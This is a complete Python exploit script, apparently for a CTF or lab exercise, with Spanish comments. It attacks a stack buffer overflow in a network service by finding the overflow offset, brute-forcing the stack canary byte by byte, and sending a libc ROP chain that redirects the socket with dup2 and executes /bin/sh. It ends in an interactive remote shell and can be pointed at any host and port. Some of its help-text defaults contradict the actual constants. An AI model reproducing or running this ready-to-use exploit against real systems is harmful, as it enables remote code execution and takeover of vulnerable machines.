# ================== IMPORTS ==================
import struct
import time
import socket
import sys
import argparse
from pwn import *

# ================== CONSTANTES Y PARÁMETROS ==================
DEFAULT_PORT = 9999
DEFAULT_HOST = "localhost"
DEFAULT_LIBC_BASE_START = 0xf7c00000
DEFAULT_LIBC_BASE_END = 0xf7e00000
DEFAULT_PAGE_SIZE = 0x1000
DEFAULT_GADGET1_OFFSET = 0x0010194a # pop rdi; ret
DEFAULT_GADGET2_OFFSET = 0x00053187 # pop rsi; ret
DEFAULT_GADGET3_OFFSET = 0x0010c5db # pop rdx; ret
DEFAULT_GADGET4_OFFSET = 0x000d40f7 # pop rax; ret
DEFAULT_GADGET5_OFFSET = 0x000928c6 # syscall gadget
DEFAULT_LIBC_PATH = "/usr/lib/libc.so.6"
DEFAULT_STATIC_LIBC_BASE= 0x00007ffff7da9000 # info proc mappings | grep libc

# ================== PARSER DE ARGUMENTOS ==================
parser = argparse.ArgumentParser(description="Exploit automatizado para buffer overflow con canary y libc.")
parser.add_argument("--host", default="localhost", help="Host objetivo (default: localhost)")
parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Puerto objetivo (default: 9999)")
parser.add_argument("--libc", default=DEFAULT_LIBC_PATH, help="Ruta a la libc (default: /usr/lib/libc.so.6)")
parser.add_argument("--libc-base-start", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_START, help="Inicio del rango base de libc (default: 0xf7d00000)")
parser.add_argument("--libc-base-end", type=lambda x: int(x,0), default=DEFAULT_LIBC_BASE_END, help="Fin del rango base de libc (default: 0xf7e00000)")
parser.add_argument("--page-size", type=lambda x: int(x,0), default=DEFAULT_PAGE_SIZE, help="Tamaño de página (default: 0x1000)")
parser.add_argument("--gadget1-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET1_OFFSET, help="Offset del primer gadget (default: 0x000238a3)")
parser.add_argument("--gadget2-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET2_OFFSET, help="Offset del segundo gadget (default: 0x0019ef7b)")
parser.add_argument("--gadget3-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET3_OFFSET, help="Offset del tercer gadget (default: 0x0010c5db)")
parser.add_argument("--gadget4-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET4_OFFSET, help="Offset del cuarto gadget (default: 0x000d40f7)")
parser.add_argument("--gadget5-offset", type=lambda x: int(x,0), default=DEFAULT_GADGET5_OFFSET, help="Offset del quinto gadget (default: 0x000928c6)")
parser.add_argument("--known-canary", type=lambda x: int(x,0), default=None, help="Valor conocido del canario (opcional)")
args = parser.parse_args()

HOST = args.host
PORT = args.port
LIBC_PATH = args.libc
LIBC_BASE_START = args.libc_base_start
LIBC_BASE_END = args.libc_base_end
PAGE_SIZE = args.page_size
GADGET1_OFFSET = args.gadget1_offset
GADGET2_OFFSET = args.gadget2_offset
GADGET3_OFFSET = args.gadget3_offset
GADGET4_OFFSET = args.gadget4_offset
GADGET5_OFFSET = args.gadget5_offset
known_canary = args.known_canary

# ================== FUNCIONES AUXILIARES ==================
def generar_direcciones_libc(base_start=LIBC_BASE_START, base_end=LIBC_BASE_END, page_size=PAGE_SIZE):
    return [addr for addr in range(base_start, base_end, page_size)]

def get_connection():
    s = socket.socket()
    s.connect((HOST, PORT))
    return s

def interactive_shell(s):
    sys.stdout.flush()
    sleep(1)
    s.settimeout(0.2)
    try:
        s.send("whoami\n".encode())
        sys.stdout.write(s.recv(4096).decode(errors='ignore'))
        while True:
            try:
                sys.stdout.flush()
                c = input("$-> ")
                s.send((c + '\n').encode())
                time.sleep(0.2)
                sys.stdout.write(s.recv(4096).decode(errors='ignore'))
            except socket.timeout:
                continue
            except (ConnectionResetError, BrokenPipeError):
                print("Conexión cerrada por el servidor.")
                break
            except KeyboardInterrupt:
                print("quit")
                s.close()
                break
    except (ConnectionResetError, BrokenPipeError):
        print("Conexión cerrada por el servidor.")

def send_payload(payload_data: bytes, timeout=0.001):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)  # timeout muy corto para no quedarnos esperando
    try:
        s.connect((HOST, PORT))
        s.sendall(payload_data)
        try:
            response = s.recv(2048)
            if len(response) == 0:
                s.close()
                return False
            s.close()
            return True
        except socket.timeout:
            s.close()
            return False
        except (ConnectionResetError, BrokenPipeError):
            s.close()
            return False
    except (socket.timeout, ConnectionRefusedError):
        s.close()
        return False
    except socket.error:
        s.close()
        return False

def calcular_offset():
    i = 20
    while True:
        payload = b"A" * i
        if not send_payload(payload, timeout=0.1):
            print(f"[+] GOT IT: offset = {i-1}")
            return i-1
        i += 1
        if i > 300:
            print("[-] Offset no encontrado en rango esperado")
            sys.exit(-1)

def byte_for_byte(payload, len_payload=8):
    p = payload
    start = len(p)
    stop = len(p) + len_payload
    while len(p) < stop:
        for i in range(256):
            attempt = p + bytes([i])
            try:
                s = get_connection()
                s.settimeout(0.01)
                s.send(attempt)
                response = s.recv(4096)
                if response:
                    p = attempt
                    print(f"[+] Byte found 0x{i:02x}")
                    break
            except socket.timeout:
                continue
            finally:
                s.close()
            if i == 255:
                print("[-] No se encontró byte en rango 0-255")
                sys.exit(-1)
    return p[-len_payload:]

# ================== FUNCIÓN PRINCIPAL ==================
def main():
    # --- Descubrir offset y canario ---
    offset = calcular_offset()
    print("[+] Byte for byte canary ...")
    canary = struct.pack(">Q", known_canary) if known_canary else byte_for_byte(b"A" * offset, 8)
    print(f"[+] Canary value is 0x{canary.hex()}")

    padding = b"B" * 8 # 8 bytes de padding por EBP

    # --- Cargar offsets de libc y gadgets ---
    libc = ELF(LIBC_PATH, checksec=False)
    system_offset = libc.symbols["system"]
    exit_offset = libc.symbols["exit"]
    ls_command_offset = next(libc.search(b"/etc/shells")) + 0x9 # 0x9 is the offset to the command
    binsh_offset = next(libc.search(b"/bin/sh"))
    dup2_offset = libc.symbols["dup2"]

    base = DEFAULT_STATIC_LIBC_BASE # gdb info proc mappings | grep libc
    system = struct.pack("<Q", (base + system_offset))
    exit_addr = struct.pack("<Q", (base + exit_offset))
    ls_cmd = struct.pack("<Q", (base + ls_command_offset))
    dup2_cmd = struct.pack("<Q", (base + dup2_offset))
    binsh = struct.pack("<Q", (base + binsh_offset))
    gadget1 = struct.pack("<Q", (base + GADGET1_OFFSET)) # pop rdi; ret
    gadget2 = struct.pack("<Q", (base + GADGET2_OFFSET)) # pop rsi; ret
    gadget3 = struct.pack("<Q", (base + GADGET3_OFFSET)) # pop rdx; ret
    gadget4 = struct.pack("<Q", (base + GADGET4_OFFSET)) # pop rax; ret
    syscall = struct.pack("<Q", (base + GADGET5_OFFSET)) # syscall; ret

    # --- Construir payload ---
    PAYLOAD = b"A" * offset
    PAYLOAD += canary
    PAYLOAD += padding # 8 bytes de padding por EBP

    # Duplicar el socket (4) a stdin, stdout, stderr
    for fd in [0, 1, 2]:
        PAYLOAD += gadget1            # pop rdi; ret
        PAYLOAD += struct.pack("<Q", 4)  # socket fd
        PAYLOAD += gadget2
        PAYLOAD += struct.pack("<Q", fd)
        PAYLOAD += dup2_cmd           # dup2
    # Ahora las llamadas a system imprimiran por el socket
    PAYLOAD += gadget1
    PAYLOAD += ls_cmd
    PAYLOAD += system
    # execv("/bin/sh", NULL, NULL) para mantener una shell interactiva viva
    PAYLOAD += gadget1 + binsh
    PAYLOAD += gadget2 + struct.pack("<Q", 0)
    PAYLOAD += gadget3 + struct.pack("<Q", 0)
    PAYLOAD += gadget4 + struct.pack("<Q", 59)
    PAYLOAD += syscall

    # --- Enviar payload y obtener shell ---
    try:
        s = get_connection()
        s.send(PAYLOAD)
        response = s.recv(4096)
        if response:
            print("[+] Shell encontrada:")
            interactive_shell(s)
        else:
            s.close()
    except socket.timeout:
        print("Socket timeout occurred.")

# ================== ENTRYPOINT ==================
if __name__ == "__main__":
    main()

